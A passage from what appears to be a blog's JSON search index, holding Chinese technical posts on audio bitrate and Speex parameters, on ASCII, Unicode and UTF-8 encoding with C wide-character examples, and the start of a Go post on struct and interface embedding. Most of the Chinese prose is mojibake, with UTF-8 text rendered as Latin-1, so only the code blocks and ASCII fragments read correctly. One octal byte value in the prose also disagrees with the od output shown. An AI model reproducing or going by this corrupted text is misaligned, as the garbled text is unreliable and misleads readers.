·ç²¾åº¦å¸¸ç”¨èŒƒå›´ä¸º8bit-32bitï¼Œè€ŒCDä¸­ä¸€èˆ¬éƒ½ä½¿ç”¨16bitã€‚\n<!-- more -->\n\n\néŸ³é¢‘çš„æ¯”ç‰¹ç‡ï¼Œå®é™…ä¸Šå°±æ˜¯å‹ç¼©æ¯”ä¾‹ã€‚\nä½†æ¯”ç‰¹ç‡æœ¬èº«å¹¶ä¸å¯¹æ–‡ä»¶çš„è´¨é‡æœ‰ç›´æ¥å½±å“ï¼Œä¾‹å¦‚æˆ‘ä»¬æŠŠ128kbçš„æ–‡ä»¶ä½œä¸ºæºæ–‡ä»¶ï¼Œå³ä½¿è½¬æ¢æˆ320kbçš„æ–‡ä»¶ï¼Œå…¶éŸ³è´¨ä¾ç„¶ä¸ä¼šæ¯”128kbå¥½ã€‚\né‚£ä¹ˆæ¯”ç‰¹ç‡ä¸­çš„æ•°å­—å’Œå­—æ¯åˆ°åº•æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿé¦–å…ˆçœ‹128kçš„å…¨ç§°â€œ128kbpsâ€ï¼Œæˆ‘ä»¬è¯•ç€åˆ†è§£ä¸€ä¸‹ï¼š128æ˜¯æ•°å­—ï¼Œkæ˜¯åƒä½ç¬¦ï¼Œbæ˜¯å•ä½ï¼Œsæ˜¯ç§’ï¼Œpså…¶å®å°±æ˜¯â€œ/sâ€ã€‚è¿™æ ·æ¥çœ‹ï¼Œ128kbpså°±æ˜¯128kb/sã€‚ä¹Ÿå°±æ˜¯æ¯ç§’128kbã€‚\n\n\n\n### speexæ ¼å¼å½•éŸ³å‚æ•°:\n\n```\nquality = 9  \t                       \t\t//speexè´¨é‡,å€¼è¶Šå¤§è´¨é‡è¶Šå¥½,æ–‡ä»¶è¶Šå¤§  open()çš„å‚æ•°\nspeex_version = \"speex-1.2rc\"      //speexç‰ˆæœ¬\nospeex_version_id = 1 \t\t\t//speexç‰ˆæœ¬id\nheader_size = 80 \t \t\t\t//speexå¤´ä¿¡æ¯å¤§å°\nrate = 16000\t\t\t\t\t//é‡‡æ ·ç‡å¤§å°\nmode = 1\t\t\t \t\t\t//mode  0æ˜¯çª„å¸¦æ¨¡å¼, 1æ˜¯å®½å¸¦æ¨¡å¼ (0=NB, 1=WB, 2=UWB)\nbitrate = -1 \t\t \t\t\t//æ¯”ç‰¹ç‡\nframe_size = 320   \t \t\t\t//ç¼“å†²åŒºå¤§å°  çª„å¸¦å¯¹åº”160, å®½å¸¦å¯¹åº”320  (NB=160, WB=320, UWB=640)\nvbr = 1\t\t\t\t\t\t//æ˜¯å¦ä½¿ç”¨å¯å˜æ¯”ç‰¹ç‡\nnframes  = 1 \t\t\t\t\t// æ¯å¸§çš„speexåŒ…çš„æ•°é‡\nchannels =1    \t\t\t        //éŸ³é¢‘è¾“å…¥çš„å£°é“ \t1æ˜¯å•å£°é“ï¼Œ2æ˜¯ç«‹ä½“å£°\n```","tags":["éŸ³é¢‘"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"å­—ç¬¦ç¼–ç ","url":"%2Fp%2Febfb97d0.html","content":"\n### ASCIIç \nASCIIç çš„å–å€¼èŒƒå›´æ˜¯0~127ï¼Œå¯ä»¥ç”¨7ä¸ªbitè¡¨ç¤ºã€‚Cè¯­è¨€ä¸­charå‹å˜é‡çš„å¤§å°è§„å®šä¸ºä¸€å­—èŠ‚ï¼Œå¦‚æœå­˜æ”¾ASCIIç åˆ™åªç”¨åˆ°ä½7ä½ï¼Œé«˜ä½ä¸º0ã€‚ä»¥ä¸‹æ˜¯ASCIIç è¡¨ï¼š\n\n\nç»å¤§å¤šæ•°è®¡ç®—æœºçš„ä¸€ä¸ªå­—èŠ‚æ˜¯8ä½ï¼Œå–å€¼èŒƒå›´æ˜¯0~255ï¼Œè€ŒASCIIç å¹¶æ²¡æœ‰è§„å®šç¼–å·ä¸º128~255çš„å­—ç¬¦ï¼Œä¸ºäº†èƒ½è¡¨ç¤ºæ›´å¤šå­—ç¬¦ï¼Œå„å‚å•†åˆ¶å®šäº†å¾ˆå¤šç§ASCIIç çš„æ‰©å±•è§„èŒƒã€‚æ³¨æ„ï¼Œè™½ç„¶é€šå¸¸æŠŠè¿™äº›è§„èŒƒç§°ä¸ºæ‰©å±•ASCIIç ï¼ˆExtended ASCIIï¼‰ï¼Œä½†å…¶å®å®ƒä»¬å¹¶ä¸å±äºASCIIç æ ‡å‡†ã€‚\n\n<!-- more -->\n\n### Unicodeå’ŒUTF-8\n\nä¸ºäº†ç»Ÿä¸€å…¨ä¸–ç•Œå„å›½è¯­è¨€æ–‡å­—å’Œä¸“ä¸šé¢†åŸŸç¬¦å·ï¼ˆä¾‹å¦‚æ•°å­¦ç¬¦å·ã€ä¹è°±ç¬¦å·ï¼‰çš„ç¼–ç ï¼ŒISOåˆ¶å®šäº†ISO 10646æ ‡å‡†ï¼Œä¹Ÿç§°ä¸ºUCSï¼ˆUniversal Character Setï¼‰ã€‚UCSç¼–ç çš„é•¿åº¦æ˜¯31ä½ï¼Œå¯ä»¥è¡¨ç¤º231ä¸ªå­—ç¬¦ã€‚å¦‚æœä¸¤ä¸ªå­—ç¬¦ç¼–ç çš„é«˜ä½ç›¸åŒï¼Œåªæœ‰ä½16ä½ä¸åŒï¼Œåˆ™å®ƒä»¬å±äºä¸€ä¸ªå¹³é¢ï¼ˆPlaneï¼‰ï¼Œæ‰€ä»¥ä¸€ä¸ªå¹³é¢ç”±216ä¸ªå­—ç¬¦ç»„æˆã€‚ç›®å‰å¸¸ç”¨çš„å¤§éƒ¨åˆ†å­—ç¬¦éƒ½ä½äºç¬¬ä¸€ä¸ªå¹³é¢ï¼ˆç¼–ç èŒƒå›´æ˜¯U-00000000~U-0000FFFDï¼‰ï¼Œç§°ä¸ºBMPï¼ˆBasic Multilingual Planeï¼‰æˆ–Plane 0ï¼Œä¸ºäº†å‘åå…¼å®¹ï¼Œå…¶ä¸­ç¼–å·ä¸º0~256çš„å­—ç¬¦å’ŒLatin-1ç›¸åŒã€‚UCSç¼–ç é€šå¸¸ç”¨U-xxxxxxxxè¿™ç§å½¢å¼è¡¨ç¤ºï¼Œè€ŒBMPçš„ç¼–ç é€šå¸¸ç”¨U+xxxxè¿™ç§å½¢å¼è¡¨ç¤ºï¼Œå…¶ä¸­xæ˜¯åå…­è¿›åˆ¶æ•°å­—ã€‚åœ¨ISOåˆ¶å®šUCSçš„åŒæ—¶ï¼Œå¦ä¸€ä¸ªç”±å‚å•†è”åˆç»„ç»‡ä¹Ÿåœ¨ç€æ‰‹åˆ¶å®šè¿™æ ·çš„ç¼–ç ï¼Œç§°ä¸ºUnicodeï¼Œåæ¥ä¸¤å®¶è”æ‰‹åˆ¶å®šç»Ÿä¸€çš„ç¼–ç ï¼Œä½†å„è‡ªå‘å¸ƒå„è‡ªçš„æ ‡å‡†æ–‡æ¡£ï¼Œæ‰€ä»¥UCSç¼–ç å’ŒUnicodeç æ˜¯ç›¸åŒçš„ã€‚\n\n\næœ‰äº†å­—ç¬¦ç¼–ç ï¼Œå¦ä¸€ä¸ªé—®é¢˜å°±æ˜¯è¿™æ ·çš„ç¼–ç åœ¨è®¡ç®—æœºä¸­æ€ä¹ˆè¡¨ç¤ºã€‚ç°åœ¨å·²ç»ä¸å¯èƒ½ç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦äº†ï¼Œæœ€ç›´æ¥çš„æƒ³æ³•å°±æ˜¯ç”¨å››ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œè¿™ç§è¡¨ç¤ºæ–¹æ³•ç§°ä¸ºUCS-4æˆ–UTF-32ï¼ŒUTFæ˜¯Unicode Transformation Formatçš„ç¼©å†™ã€‚ä¸€æ–¹é¢è¿™æ ·æ¯”è¾ƒæµªè´¹å­˜å‚¨ç©ºé—´ï¼Œç”±äºå¸¸ç”¨å­—ç¬¦éƒ½é›†ä¸­åœ¨BMPï¼Œé«˜ä½çš„ä¸¤ä¸ªå­—èŠ‚é€šå¸¸æ˜¯0ï¼Œå¦‚æœåªç”¨ASCIIç æˆ–Latin-1ï¼Œé«˜ä½çš„ä¸‰ä¸ªå­—èŠ‚éƒ½æ˜¯0ã€‚å¦ä¸€ç§æ¯”è¾ƒèŠ‚çœå­˜å‚¨ç©ºé—´çš„åŠæ³•æ˜¯ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œç§°ä¸ºUCS-2æˆ–UTF-16ï¼Œè¿™æ ·åªèƒ½è¡¨ç¤ºBMPä¸­çš„å­—ç¬¦ï¼Œä½†BMPä¸­æœ‰ä¸€äº›æ‰©å±•å­—ç¬¦ï¼Œå¯ä»¥ç”¨ä¸¤ä¸ªè¿™æ ·çš„æ‰©å±•å­—ç¬¦è¡¨ç¤ºå…¶å®ƒå¹³é¢çš„å­—ç¬¦ï¼Œç§°ä¸ºSurrogate Pairã€‚æ— è®ºæ˜¯UTF-32è¿˜æ˜¯UTF-16éƒ½æœ‰ä¸€ä¸ªæ›´ä¸¥é‡çš„é—®é¢˜æ˜¯å’ŒCè¯­è¨€ä¸å…¼å®¹ï¼Œåœ¨Cè¯­è¨€ä¸­0å­—èŠ‚è¡¨ç¤ºå­—ç¬¦ä¸²ç»“å°¾ï¼Œåº“å‡½æ•°strlenã€strcpyç­‰ç­‰éƒ½ä¾èµ–äºè¿™ä¸€ç‚¹ï¼Œå¦‚æœå­—ç¬¦ä¸²ç”¨UTF-32å­˜å‚¨ï¼Œå…¶ä¸­æœ‰å¾ˆå¤š0å­—èŠ‚å¹¶ä¸è¡¨ç¤ºå­—ç¬¦ä¸²ç»“å°¾ï¼Œè¿™å°±ä¹±å¥—äº†ã€‚\n\n\n\nUNIXä¹‹çˆ¶Ken Thompsonæå‡ºçš„UTF-8ç¼–ç å¾ˆå¥½åœ°è§£å†³äº†è¿™äº›é—®é¢˜ï¼Œç°åœ¨å¾—åˆ°å¹¿æ³›åº”ç”¨ã€‚\n\nUTF-8å…·æœ‰ä»¥ä¸‹æ€§è´¨ï¼š\n\n\n  â— ç¼–ç ä¸ºU+0000~U+007Fçš„å­—ç¬¦åªå ä¸€ä¸ªå­—èŠ‚ï¼Œå°±æ˜¯0x00~0x7Fï¼Œå’ŒASCIIç å…¼å®¹ã€‚\n  \n  â— ç¼–ç å¤§äºU+007Fçš„å­—ç¬¦ç”¨2~6ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œæ¯ä¸ªå­—èŠ‚çš„æœ€é«˜ä½éƒ½æ˜¯1ï¼Œè€ŒASCIIç çš„æœ€é«˜ä½éƒ½æ˜¯0ï¼Œå› æ­¤éASCIIç å­—ç¬¦çš„è¡¨ç¤ºä¸­ä¸ä¼šå‡ºç°ASCIIç å­—èŠ‚ï¼ˆä¹Ÿå°±ä¸ä¼šå‡ºç°0å­—èŠ‚ï¼‰ã€‚\n  \n  â— ç”¨äºè¡¨ç¤ºéASCIIç å­—ç¬¦çš„å¤šå­—èŠ‚åºåˆ—ä¸­ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚çš„å–å€¼èŒƒå›´æ˜¯0xC0~0xFDï¼Œæ ¹æ®å®ƒå¯ä»¥åˆ¤æ–­åé¢æœ‰å¤šå°‘ä¸ªå­—èŠ‚ä¹Ÿå±äºå½“å‰å­—ç¬¦çš„ç¼–ç ã€‚åé¢æ¯ä¸ªå­—èŠ‚çš„å–å€¼èŒƒå›´éƒ½æ˜¯0x80~0xBFï¼Œè§ä¸‹é¢çš„è¯¦ç»†è¯´æ˜ã€‚\n  \n  â— UCSå®šä¹‰çš„æ‰€æœ‰231ä¸ªå­—ç¬¦éƒ½å¯ä»¥ç”¨UTF-8ç¼–ç è¡¨ç¤ºå‡ºæ¥ã€‚\n  \n  â— UTF-8ç¼–ç æœ€é•¿6ä¸ªå­—èŠ‚ï¼ŒBMPå­—ç¬¦çš„UTF-8ç¼–ç æœ€é•¿ä¸‰ä¸ªå­—èŠ‚ã€‚\n  \n  â— 0xFEå’Œ0xFFè¿™ä¸¤ä¸ªå­—èŠ‚åœ¨UTF-8ç¼–ç ä¸­ä¸ä¼šå‡ºç°ã€‚\n\nå…·ä½“æ¥è¯´ï¼ŒUTF-8ç¼–ç æœ‰ä»¥ä¸‹å‡ ç§æ ¼å¼ï¼š\n\n```\nU-00000000 â€“ U-0000007F:  0xxxxxxx\nU-00000080 â€“ U-000007FF:  110xxxxx 10xxxxxx\nU-00000800 â€“ U-0000FFFF:  1110xxxx 10xxxxxx 10xxxxxx\nU-00010000 â€“ U-001FFFFF:  11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\nU-00200000 â€“ U-03FFFFFF:  111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\nU-04000000 â€“ U-7FFFFFFF:  1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n```\nç¬¬ä¸€ä¸ªå­—èŠ‚è¦ä¹ˆæœ€é«˜ä½æ˜¯0ï¼ˆASCIIå­—èŠ‚ï¼‰ï¼Œè¦ä¹ˆæœ€é«˜ä¸¤ä½éƒ½æ˜¯1ï¼Œ\n\næœ€é«˜ä½ä¹‹å1çš„ä¸ªæ•°å†³å®šåé¢æœ‰å¤šå°‘ä¸ªå­—èŠ‚ä¹Ÿå±äºå½“å‰å­—ç¬¦ç¼–ç ï¼Œä¾‹å¦‚111110xxï¼Œæœ€é«˜ä½ä¹‹åè¿˜æœ‰å››ä¸ª1ï¼Œè¡¨ç¤ºåé¢æœ‰å››ä¸ªå­—èŠ‚ä¹Ÿå±äºå½“å‰å­—ç¬¦çš„ç¼–ç ã€‚åé¢æ¯ä¸ªå­—èŠ‚çš„æœ€é«˜ä¸¤ä½éƒ½æ˜¯10ï¼Œå¯ä»¥å’Œç¬¬ä¸€ä¸ªå­—èŠ‚åŒºåˆ†å¼€ã€‚è¿™æ ·çš„è®¾è®¡æœ‰åˆ©äºè¯¯ç åŒæ­¥ï¼Œä¾‹å¦‚åœ¨ç½‘ç»œä¼ è¾“è¿‡ç¨‹ä¸­ä¸¢å¤±äº†å‡ ä¸ªå­—èŠ‚ï¼Œå¾ˆå®¹æ˜“åˆ¤æ–­å½“å‰å­—ç¬¦æ˜¯ä¸å®Œæ•´çš„ï¼Œä¹Ÿå¾ˆå®¹æ˜“æ‰¾åˆ°ä¸‹ä¸€ä¸ªå­—ç¬¦ä»å“ªé‡Œå¼€å§‹ï¼Œç»“æœé¡¶å¤šä¸¢æ‰ä¸€ä¸¤ä¸ªå­—ç¬¦ï¼Œè€Œä¸ä¼šå¯¼è‡´åé¢çš„ç¼–ç è§£é‡Šå…¨éƒ¨æ··ä¹±äº†ã€‚ä¸Šé¢çš„æ ¼å¼ä¸­æ ‡ä¸ºxçš„ä½å°±æ˜¯UCSç¼–ç ï¼Œæœ€åä¸€ç§6å­—èŠ‚çš„æ ¼å¼ä¸­xä½æœ‰31ä¸ªï¼Œå¯ä»¥è¡¨ç¤º31ä½çš„UCSç¼–ç ï¼ŒUTF-8å°±åƒä¸€åˆ—ç«è½¦ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯è½¦å¤´ï¼Œåé¢æ¯ä¸ªå­—èŠ‚æ˜¯è½¦å¢ï¼Œå…¶ä¸­æ‰¿è½½çš„è´§ç‰©æ˜¯UCSç¼–ç ã€‚UTF-8è§„å®šæ‰¿è½½çš„UCSç¼–ç ä»¥å¤§ç«¯è¡¨ç¤ºï¼Œä¹Ÿå°±æ˜¯è¯´ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸­çš„xæ˜¯UCSç¼–ç çš„é«˜ä½ï¼Œåé¢å­—èŠ‚ä¸­çš„xæ˜¯UCSç¼–ç çš„ä½ä½ã€‚\nä¾‹å¦‚U+00A9ï¼ˆÂ©å­—ç¬¦ï¼‰çš„äºŒè¿›åˆ¶æ˜¯10101001ï¼Œç¼–ç æˆUTF-8æ˜¯11000010 10101001ï¼ˆ0xC2 0xA9ï¼‰ï¼Œä½†ä¸èƒ½ç¼–ç æˆ11100000 10000010 10101001ï¼ŒUTF-8è§„å®šæ¯ä¸ªå­—ç¬¦åªèƒ½ç”¨å°½å¯èƒ½å°‘çš„å­—èŠ‚æ¥ç¼–ç ã€‚\n\n\n```\n10101001\n11000010 10101001     \t           // å¤§ç«¯ä¹Ÿç¬¦åˆé˜…è¯»è§„èŒƒ\n\n\n10101001\n11100000 10000010 10101001   //è¿™æ ·ä¸å¯ä»¥, ç”¨å°½å¯èƒ½å°‘çš„å­—èŠ‚æ¥ç¼–ç \n```\n\n\n\n### åœ¨Linux Cç¼–ç¨‹ä¸­ä½¿ç”¨Unicodeå’ŒUTF-8\n\nç›®å‰å„ç§Linuxå‘è¡Œç‰ˆéƒ½æ”¯æŒUTF-8ç¼–ç ï¼Œå½“å‰ç³»ç»Ÿçš„è¯­è¨€å’Œå­—ç¬¦ç¼–ç è®¾ç½®ä¿å­˜åœ¨ä¸€äº›ç¯å¢ƒå˜é‡ä¸­ï¼Œå¯ä»¥é€šè¿‡localeå‘½ä»¤æŸ¥çœ‹ï¼š\n\n```\n$ locale\nLANG=en_US.UTF-8\nLC_CTYPE=\"en_US.UTF-8\"\nLC_NUMERIC=\"en_US.UTF-8\"\nLC_TIME=\"en_US.UTF-8\"\nLC_COLLATE=\"en_US.UTF-8\"\nLC_MONETARY=\"en_US.UTF-8\"\nLC_MESSAGES=\"en_US.UTF-8\"\nLC_PAPER=\"en_US.UTF-8\"\nLC_NAME=\"en_US.UTF-8\"\nLC_ADDRESS=\"en_US.UTF-8\"\nLC_TELEPHONE=\"en_US.UTF-8\"\nLC_MEASUREMENT=\"en_US.UTF-8\"\nLC_IDENTIFICATION=\"en_US.UTF-8\"\nLC_ALL=\n```\nå¸¸ç”¨æ±‰å­—ä¹Ÿéƒ½ä½äºBMPä¸­ï¼Œæ‰€ä»¥ä¸€ä¸ªæ±‰å­—çš„å­˜å‚¨é€šå¸¸å 3ä¸ªå­—èŠ‚ã€‚\n\n\n\n\nä¾‹å¦‚ç¼–è¾‘ä¸€ä¸ªCç¨‹åºï¼š\n\n```\n#include <stdio.h>\n\nint main(void)\n{\n\tprintf(\"ä½ å¥½\\n\");\n\treturn 0;\n}\n```\næºæ–‡ä»¶æ˜¯ä»¥UTF-8ç¼–ç å­˜å‚¨çš„ï¼š\n\n```\n$ od -tc nihao.c \n0000000   #   i   n   c   l   u   d   e       <   s   t   d   i   o   .\n0000020   h   >  \\n  \\n   i   n   t       m   a   i   n   (   v   o   i\n0000040   d   )  \\n   {  \\n  \\t   p   r   i   n   t   f   (   \" 344 275\n0000060 240 345 245 275   \\   n   \"   )   ;  \\n  \\t   r   e   t   u   r\n0000100   n       0   ;  \\n   }  \\n\n0000107\n```\nå…¶ä¸­å…«è¿›åˆ¶çš„344 375 240ï¼ˆåå…­è¿›åˆ¶e4 bd a0ï¼‰å°±æ˜¯â€œä½ â€çš„UTF-8ç¼–ç ï¼Œå…«è¿›åˆ¶çš„345 245 275ï¼ˆåå…­è¿›åˆ¶e5 a5 bdï¼‰å°±æ˜¯â€œå¥½â€ã€‚æŠŠå®ƒç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ï¼Œ\"ä½ å¥½\\n\"è¿™ä¸ªå­—ç¬¦ä¸²å°±æˆäº†è¿™æ ·ä¸€ä¸²å­—èŠ‚ï¼še4 bd a0 e5 a5 bd 0a 00ï¼Œæ±‰å­—åœ¨å…¶ä¸­ä»ç„¶æ˜¯UTF-8ç¼–ç çš„ï¼Œä¸€ä¸ªæ±‰å­—å 3ä¸ªå­—èŠ‚ï¼Œè¿™ç§å­—ç¬¦åœ¨Cè¯­è¨€ä¸­ç§°ä¸ºå¤šå­—èŠ‚å­—ç¬¦ï¼ˆMultibyte Characterï¼‰ã€‚è¿è¡Œè¿™ä¸ªç¨‹åºç›¸å½“äºæŠŠè¿™ä¸€ä¸²å­—èŠ‚writeåˆ°å½“å‰ç»ˆç«¯çš„è®¾å¤‡æ–‡ä»¶ã€‚å¦‚æœå½“å‰ç»ˆç«¯çš„é©±åŠ¨ç¨‹åºèƒ½å¤Ÿè¯†åˆ«UTF-8ç¼–ç å°±èƒ½æ‰“å°å‡ºæ±‰å­—ï¼Œå¦‚æœå½“å‰ç»ˆç«¯çš„é©±åŠ¨ç¨‹åºä¸èƒ½è¯†åˆ«UTF-8ç¼–ç ï¼ˆæ¯”å¦‚ä¸€èˆ¬çš„å­—ç¬¦ç»ˆç«¯ï¼‰å°±æ‰“å°ä¸å‡ºæ±‰å­—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåƒè¿™ç§ç¨‹åºï¼Œè¯†åˆ«æ±‰å­—çš„å·¥ä½œæ—¢ä¸æ˜¯ç”±Cç¼–è¯‘å™¨åšçš„ä¹Ÿä¸æ˜¯ç”±libcåšçš„ï¼ŒCç¼–è¯‘å™¨åŸå°ä¸åŠ¨åœ°æŠŠæºæ–‡ä»¶ä¸­çš„UTF-8ç¼–ç å¤åˆ¶åˆ°ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œlibcåªæ˜¯å½“ä½œä»¥0ç»“å°¾çš„å­—ç¬¦ä¸²åŸå°ä¸åŠ¨åœ°writeç»™å†…æ ¸ï¼Œè¯†åˆ«æ±‰å­—çš„å·¥ä½œæ˜¯ç”±ç»ˆç«¯çš„é©±åŠ¨ç¨‹åºåšçš„ã€‚\n\n\n\nä½†æ˜¯ä»…æœ‰è¿™ç§ç¨‹åº¦çš„æ±‰å­—æ”¯æŒæ˜¯ä¸å¤Ÿçš„ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦åœ¨Cç¨‹åºä¸­æ“ä½œå­—ç¬¦ä¸²é‡Œçš„å­—ç¬¦ï¼Œæ¯”å¦‚æ±‚å­—ç¬¦ä¸²\"ä½ å¥½\\n\"ä¸­æœ‰å‡ ä¸ªæ±‰å­—æˆ–å­—ç¬¦ï¼Œç”¨strlenå°±ä¸çµäº†ï¼Œå› ä¸ºstrlenåªçœ‹ç»“å°¾çš„0å­—èŠ‚è€Œä¸ç®¡å­—ç¬¦ä¸²é‡Œå­˜çš„æ˜¯ä»€ä¹ˆï¼Œæ±‚å‡ºæ¥çš„æ˜¯å­—èŠ‚æ•°7ã€‚ä¸ºäº†åœ¨ç¨‹åºä¸­æ“ä½œUnicodeå­—ç¬¦ï¼ŒCè¯­è¨€å®šä¹‰äº†å®½å­—ç¬¦ï¼ˆWide Characterï¼‰ç±»å‹wchar_tå’Œä¸€äº›åº“å‡½æ•°ã€‚\n\n\nåœ¨å­—ç¬¦å¸¸é‡æˆ–å­—ç¬¦ä¸²å­—é¢å€¼å‰é¢åŠ ä¸€ä¸ªLå°±è¡¨ç¤ºå®½å­—ç¬¦å¸¸é‡æˆ–å®½å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚å®šä¹‰wchar_t c = L'ä½ ';ï¼Œå˜é‡cçš„å€¼å°±æ˜¯æ±‰å­—â€œä½ â€çš„31ä½UCSç¼–ç ï¼Œè€ŒL\"ä½ å¥½\\n\"å°±ç›¸å½“äº{L'ä½ ', L'å¥½', L'\\n', 0}ï¼Œwcslenå‡½æ•°å°±å¯ä»¥å–å®½å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ä¸ªæ•°ã€‚\n\n\n```\n#include <stdio.h>\n#include <locale.h>\n\nint main(void)\n{\n\tif (!setlocale(LC_CTYPE, \"\")) {\n\t\tfprintf(stderr, \"Can't set the specified locale! \"\n\t\t\t\"Check LANG, LC_CTYPE, LC_ALL.\\n\");\n\t\treturn 1;\n\t}\n\tprintf(\"%ls\", L\"ä½ å¥½\\n\");\n\treturn 0;\n}\n```\n\nå®½å­—ç¬¦ä¸²L\"ä½ å¥½\\n\"åœ¨æºä»£ç ä¸­å½“ç„¶è¿˜æ˜¯å­˜æˆUTF-8ç¼–ç çš„ï¼Œä½†ç¼–è¯‘å™¨ä¼šæŠŠå®ƒå˜æˆ4ä¸ªUCSç¼–ç 0x00004f60 0x0000597d 0x0000000a 0x00000000ä¿å­˜åœ¨ç›®æ ‡æ–‡ä»¶ä¸­ï¼ŒæŒ‰å°ç«¯å­˜å‚¨å°±æ˜¯60 4f 00 00 7d 59 00 00 0a 00 00 00 00 00 00 00ï¼Œç”¨odå‘½ä»¤æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶åº”è¯¥èƒ½æ‰¾åˆ°è¿™äº›å­—èŠ‚ã€‚\n\n\nprintfçš„%lsè½¬æ¢è¯´æ˜è¡¨ç¤ºæŠŠåé¢çš„å‚æ•°æŒ‰å®½å­—ç¬¦ä¸²è§£é‡Šï¼Œä¸æ˜¯è§åˆ°0å­—èŠ‚å°±ç»“æŸï¼Œè€Œæ˜¯è§åˆ°UCSç¼–ç ä¸º0çš„å­—ç¬¦æ‰ç»“æŸï¼Œä½†æ˜¯è¦writeåˆ°ç»ˆç«¯ä»ç„¶éœ€è¦ä»¥å¤šå­—èŠ‚ç¼–ç è¾“å‡ºï¼Œè¿™æ ·ç»ˆç«¯é©±åŠ¨ç¨‹åºæ‰èƒ½è¯†åˆ«ï¼Œæ‰€ä»¥printfåœ¨å†…éƒ¨æŠŠå®½å­—ç¬¦ä¸²è½¬æ¢æˆå¤šå­—èŠ‚å­—ç¬¦ä¸²å†writeå‡ºå»ã€‚äº‹å®ä¸Šï¼ŒCæ ‡å‡†å¹¶æ²¡æœ‰è§„å®šå¤šå­—èŠ‚å­—ç¬¦å¿…é¡»ä»¥UTF-8ç¼–ç ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶å®ƒçš„å¤šå­—èŠ‚ç¼–ç ï¼Œåœ¨è¿è¡Œæ—¶æ ¹æ®ç¯å¢ƒå˜é‡ç¡®å®šå½“å‰ç³»ç»Ÿçš„ç¼–ç ï¼Œæ‰€ä»¥åœ¨ç¨‹åºå¼€å¤´éœ€è¦è°ƒç”¨setlocaleè·å–å½“å‰ç³»ç»Ÿçš„ç¼–ç è®¾ç½®ï¼Œå¦‚æœå½“å‰ç³»ç»Ÿæ˜¯UTF-8çš„ï¼Œprintfå°±æŠŠUCSç¼–ç è½¬æ¢æˆUTF-8ç¼–ç çš„å¤šå­—èŠ‚å­—ç¬¦ä¸²å†writeå‡ºå»ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç¨‹åºåœ¨åšå†…éƒ¨è®¡ç®—æ—¶é€šå¸¸ä»¥å®½å­—ç¬¦ç¼–ç ï¼Œå¦‚æœè¦å­˜ç›˜æˆ–è€…è¾“å‡ºç»™åˆ«çš„ç¨‹åºï¼Œæˆ–è€…é€šè¿‡ç½‘ç»œå‘ç»™åˆ«çš„ç¨‹åºï¼Œåˆ™é‡‡ç”¨å¤šå­—èŠ‚ç¼–ç ã€‚","tags":["å­—ç¬¦"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"golang_struct_interfaceåµŒå¥—ä¼ å‚å’Œå¤šæ€","url":"%2Fp%2Fa5099912.html","content":"\n\n# 1. interface struct èƒ½å¦ç›¸äº’åµŒå¥—\n\n1. struct struct //ç»§æ‰¿(ä¸èƒ½å¤šæ€), å¦‚æœå†…éƒ¨structå®ç°äº†æ¥å£, å®ƒä¹Ÿç›¸å½“äºå®ç°äº†æ¥å£\n2. struct interface //å¯ä»¥å¤šæ€\n3. interface interface  //å•çº¯çš„å¯¼å…¥\n4. interface struct  //ä¸å…è®¸\n\n<!-- more -->\n\n# 2. structæ–¹æ³•å‚æ•°å®šä¹‰æŒ‡é’ˆè¿˜æ˜¯å€¼ \n\næ— è®ºæ–¹æ³•å‚æ•°å®šä¹‰æˆæŒ‡é’ˆè¿˜æ˜¯å€¼, éƒ½å¯ä»¥è°ƒç”¨\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype S struct {\n\tage int\n}\n\nfunc (s S) Value() {\n\tfmt.Println(s.age)\n}\n\nfunc (s *S) Point(age int) {\n\ts.age = age\n}\n\nfunc main() {\n\n\t// è‡ªå·±æ˜¯æŒ‡é’ˆ, èƒ½å¤Ÿè°ƒç”¨ä¸€åˆ‡\n\ts := new(S)\n\ts.Point(1)\n\ts.Value()      //1\n\tfmt.Println(s) //&{1}\n\n\t// è‡ªå·±ä¸æ˜¯æŒ‡é’ˆ,ä¹Ÿèƒ½è°ƒç”¨æŒ‡é’ˆå‡½æ•°ä¿®æ”¹å€¼\n\tv := S{}\n\tv.Point(2)\n\tv.Value()      //2\n\tfmt.Println(v) //{2}\n}\n```\n\n\n\n# 3. interface èƒ½å¦èµ‹å€¼å®ç°äº†çš„ struct\n\n### 3.1 structæ˜¯å€¼çš„éƒ½å¯ä»¥èµ‹å€¼\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype I interface {\n\tGet()\n}\ntype S struct {\n}\n\nfunc (s S) Get() {\n\tfmt.Println(\"get\")\n}\n\nfunc main() {\n\n\tvar i I\n\n\ti = S{}\n\ti.Get() // get\n\n\ti = &S{}\n\ti.Get() //get\n}\n```\n\n### 3.2 structæ˜¯æŒ‡é’ˆçš„åªèƒ½æŒ‡é’ˆèµ‹å€¼\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype I interface {\n\tGet()\n}\ntype S struct {\n}\n\nfunc (s *S) Get() {\n\tfmt.Println(\"get\")\n}\n\nfunc main() {\n\n\tvar i I\n\n\t//i = S{} //æ­¤å¤„ä¸èƒ½èµ‹å€¼\n\t//i.Get()\n\n\ti = &S{}\n\ti.Get() //get\n}\n```\n\n\n\n# 4. golangå‡å¤šæ€\n\n\n```go\npackage 